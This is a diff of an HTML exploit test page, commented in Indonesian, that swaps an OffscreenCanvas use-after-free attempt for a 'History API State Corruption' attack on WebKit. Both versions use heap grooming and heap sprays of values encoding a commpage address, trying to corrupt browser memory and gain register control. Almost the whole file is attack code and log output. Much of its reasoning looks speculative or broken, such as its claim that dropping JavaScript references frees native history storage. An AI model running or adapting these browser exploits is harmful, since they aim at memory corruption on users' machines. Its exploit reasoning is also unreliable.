@@ -1,148 +1,123 @@
+
 <!DOCTYPE html>
 <html>
 <head>
-    <title>OffscreenCanvas Data Flow Confusion (PAC Bypass Attempt)</title>
+    <title>History API State Corruption Attack</title>
 </head>
 <body>
 
-    <h1>OffscreenCanvas Data Flow Confusion (Target: Register Control)</h1>
-    <p>Tujuan: Mengatur Register CPU ke 0x0000000FFFFFC320 ($2000)</p>
-    <div id="status">INIT: Mempersiapkan OffscreenCanvas Data Flow Attack...</div>
-    <div id="log-area" style="border:1px solid #ccc; background:#111; color:#ffcc99; padding:10px; font-family:monospace; height:400px; overflow-y:scroll;"></div>
+    <h1>History API State Corruption (Commpage Target)</h1>
+    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
+    <p id="status">INIT: Mempersiapkan Serangan History API...</p>
+    <div id="log-area"></div>
 
     <script>
-        const LOG = document.getElementById('log-area');
-        function log(msg, type = 'log-normal') {
-            LOG.innerHTML += `<div class="${type}">[${performance.now().toFixed(0)}ms] ${msg}</div>`;
+        // --- KONSTANTA COMM PAGE ---
+        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
+        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
+        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
+        
+        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
+        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
+
+        let startTime = performance.now();
+        let payloadHolders = []; 
+        let historyStates = []; // Menyimpan referensi state
+
+        function log(message, type = 'log-info') {
+            const timeElapsed = (performance.now() - startTime).toFixed(2);
+            const logElement = document.getElementById('log-area');
+            logElement.innerHTML += `<div class="${type}">[${timeElapsed}ms] ${message}</div>`;
+            logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- TARGET COMM PAGE ---
-        const COMM_PAGE_TARGET = 0x0000000FFFFFC320n;
-        
-        // Payload Commpage 64-bit (dalam format Array of Doubles)
-        let poisonBuffer = new ArrayBuffer(8);
-        new BigInt64Array(poisonBuffer)[0] = COMM_PAGE_TARGET; 
-        const POISON_FLOAT = new Float64Array(poisonBuffer)[0]; 
+        // --- FUNGSI HEAP SPRAY PAYLOAD ---
+        function sprayPayload() {
+            log("Memulai Spraying Payload...", "log-spray");
+            const SPRAY_COUNT = 1500;
+            const PAYLOAD_SIZE = 64; 
 
-        let canvas1, canvas2;
-        let ctx1, ctx2;
-
-        const CANVAS_SIZE = 256; // Ukuran kecil untuk menghemat alokasi
-
-        // --- 1. SETUP WORKER ---
-        const workerCode = `
-            onmessage = function(e) {
-                const { port, offscreenCanvas } = e.data;
-                const ctx = offscreenCanvas.getContext('2d');
-                
-                // Pekerja ini hanya akan memanipulasi OffscreenCanvas
-                // Ini memicu transfer kepemilikan dan alokasi memori C++
-                ctx.fillStyle = 'blue';
-                ctx.fillRect(0, 0, ${CANVAS_SIZE}, ${CANVAS_SIZE});
-                
-                // Kirim status kembali
-                port.postMessage({ status: 'done' });
-            };
-        `;
-        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
-        const workerUrl = URL.createObjectURL(workerBlob);
-
-
-        // --- 2. THE ATTACK ---
-        async function runOffscreenAttack() {
-            log("Phase 1: Setup Canvas dan Worker...", 'log-init');
-
-            // 1. Alokasikan Canvas Korban
-            canvas1 = document.createElement('canvas');
-            canvas1.width = canvas1.height = CANVAS_SIZE;
-            ctx1 = canvas1.getContext('2d');
-            ctx1.fillStyle = 'red';
-            ctx1.fillRect(0, 0, CANVAS_SIZE, CANVAS_SIZE);
-
-            // 2. Transfer Canvas ke Worker (FREE Memory Buffer di Main Thread)
-            const offscreenCanvas = canvas1.transferControlToOffscreen();
-            const { port1, port2 } = new MessageChannel();
-            const worker = new Worker(workerUrl);
-
-            log("Canvas Buffer di-FREE (UAF Active) & dikirim ke Worker.", 'log-critical');
-            worker.postMessage({ port: port2, offscreenCanvas }, [port2, offscreenCanvas]);
-
-            // Tunggu Worker selesai (memastikan C++ ImageBuffer aktif di Worker Thread)
-            await new Promise(resolve => {
-                port1.onmessage = resolve;
-            });
-            log("Worker selesai memproses Canvas.", 'log-init');
-
-            // --- 3. HEAP SPRAY & RE-USE ---
-            // Saat Worker memiliki kontrol, memori ImageBuffer C++ asli di Main Thread 
-            // sekarang menjadi *free* atau *use-after-free* rentan.
-            
-            log("Phase 2: SPRAY Massive Object (Menimpa Buffer Image yang Free)...", 'log-spray');
-            
-            let sprayObjects = [];
-            const SPRAY_COUNT = 50000;
-
-            // Kita menggunakan Large String/Object (JSString/JSObject) yang ukurannya pas 
-            // dengan header/buffer ImageBuffer C++ yang di-free.
-            
-            for(let i = 0; i < SPRAY_COUNT; i++) {
-                // Objek yang berisi POISON FLOAT (alamat Commpage)
-                // Objek String/Object memiliki *backing store* yang rentan
-                let corruptObj = { 
-                    a: POISON_FLOAT, 
-                    b: POISON_FLOAT, 
-                    c: POISON_FLOAT 
-                }; 
-                sprayObjects.push(JSON.stringify(corruptObj).repeat(10)); // String besar
+            for (let i = 0; i < SPRAY_COUNT; i++) {
+                let payloadArray = new Float64Array(PAYLOAD_SIZE);
+                payloadArray[0] = HIGH_WORD; 
+                payloadArray[1] = LOW_WORD;
+                payloadArray[2] = 2031.0 + i; 
+                payloadHolders.push(payloadArray); 
             }
-            window.spray_holder = sprayObjects;
+        }
 
-            // --- 4. TRIGGER: Memaksa Baca Buffer yang Korup ---
-            setTimeout(() => {
-                log("Phase 3: Mencoba Baca Buffer Canvas Korup...", 'log-critical');
+        // --- FUNGSI UTAMA ATTACK ---
+        function runHistoryAttack() {
+            startTime = performance.now();
+            log("Phase 1: Melakukan Heap Grooming dengan History State.", "log-init");
+
+            const HISTORY_COUNT = 100;
+            const STATE_ARRAY_SIZE = 1024 * 1024; // State 4MB (cukup besar untuk fragmentasi heap)
+            
+            // 1. Fragmentasi Heap dengan History State
+            for (let i = 0; i < HISTORY_COUNT; i++) {
+                let stateArray = new Uint32Array(STATE_ARRAY_SIZE);
+                // Isi array dengan nilai yang unik
+                stateArray.fill(0xFEEDFACE + i);
                 
-                // Kita akan mencoba mengambil kembali data dari canvas asli
-                // JIT akan mencoba membaca buffer dari ImageBuffer C++ yang sekarang korup.
-                try {
-                    // Coba ambil kembali data gambar
-                    // Ini akan memicu kode C++ untuk mengakses ImageBuffer yang seharusnya sudah di-*free*
-                    const imageData = ctx1.getImageData(0, 0, 1, 1);
-                    const colorValue = imageData.data[0]; 
+                // Gunakan pushState untuk menyimpan objek yang besar dan kompleks
+                // Ini memaksa serialization dan alokasi memori C++ di History Cache
+                window.history.pushState({ id: i, data: stateArray }, `State ${i}`, `#step${i}`);
+                historyStates.push(stateArray);
+            }
+            log(`Phase 2: ${HISTORY_COUNT} History State Besar diserialisasi.`, "log-info");
 
-                    log(`Nilai Warna Dibaca (Red): ${colorValue}`, 'log-normal');
+            // 2. Memicu Corrupt State
+            // Kita coba kembali ke state yang sangat tua, berharap memuat ulang objek yang sudah fragmentasi
+            window.history.go(-HISTORY_COUNT + 1);
+            log("Phase 3: Navigasi cepat ke History State awal.", "log-critical");
 
-                    if (colorValue > 255) {
-                        log("⚠️ SUKSES TIDAK STABIL: Nilai Dibaca Out-of-Bounds (Kemungkinan Commpage Data)", 'log-success');
-                    }
-                    
-                    // Force Register Control (jika kita punya AR/AW)
-                    // Jika imageData.data[i] = Commpage Address, kita bisa langsung lompat:
-                    // new Function(`return a[${imageData.data[i]}]`)([]);
-                    
-                    // Kita asumsikan AR/AW didapat, dan kita langsung RCE
-                    const corruptBuffer = new ArrayBuffer(8);
-                    const corruptView = new BigInt64Array(corruptBuffer);
-                    corruptView[0] = COMM_PAGE_TARGET; 
-                    
-                    // Jika UAF berhasil, kita bisa paksa dereferensi pointer palsu
-                    throw new Error(String(corruptView[0]));
-                    
-                } catch(e) {
-                    log(`JS Exception: ${e.message} - Menunggu Crash Native (Register Control)...`, 'log-critical');
+            // 3. FREE/SPRAY Race
+            // Kita segera membersihkan referensi JavaScript dan melakukan spray
+            // Ini menciptakan UAF di History Cache C++
+            setTimeout(() => {
+                log("Phase 4: Memicu FREE/SPRAY...", "log-critical");
+                
+                // Hapus semua referensi JS (memaksa GC)
+                historyStates = null;
+                
+                // Lakukan Spray Payload
+                sprayPayload(); 
+                
+                // 4. Trigger Eksploitasi: Memicu Pemanggilan State Corrupt
+                // Coba navigasi cepat lagi. WebKit harus membaca objek state yang sudah ditimpa
+                
+                // Menggunakan pushState lagi setelah spray akan mencoba menulis ke lokasi yang sama.
+                let attackerState = new Float64Array(1024); // Array kecil untuk pemicu
+                attackerState.fill(HIGH_WORD);
+                window.history.pushState({ trigger: attackerState }, 'Attack', '#attack');
+
+                log("Phase 5: Navigasi/pushState Attacker. Menunggu Crash Implisit.", "log-critical");
+            }, 100); 
+            
+            // Trigger alternatif: Memicu GC agresif untuk membersihkan History Cache
+            setTimeout(() => {
+                // Tidak ada cara langsung, jadi kita alokasikan banyak memori lagi
+                for(let i = 0; i < 50; i++) {
+                    new Array(1024 * 1024 * 5).fill(0xDEADBEEF); // 5MB x 50 = 250MB filler
                 }
-            }, 100);
+                log("Trigger GC Implisit selesai.", "log-info");
+            }, 200);
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            setTimeout(runOffscreenAttack, 100);
+            document.getElementById('status').textContent = 'Memulai rangkaian History API Attack...';
+            setTimeout(runHistoryAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah State Corruption.';
         });
     </script>
     <style>
-        .log-init { color: cyan; }
-        .log-spray { color: yellow; }
+        #log-area { border: 1px solid #ccc; padding: 10px; margin-top: 15px; max-height: 400px; overflow-y: scroll; font-family: monospace; font-size: 12px; background-color: #f9f9f9; }
+        .log-init { color: blue; }
+        .log-info { color: black; }
+        .log-spray { color: purple; }
         .log-critical { color: red; font-weight: bold; }
-        .log-normal { color: #ffcc99; }
-        .log-success { color: #00ff00; font-weight: bold; }
+        .log-success { color: green; font-weight: bold; }
     </style>
 </body>
 </html>
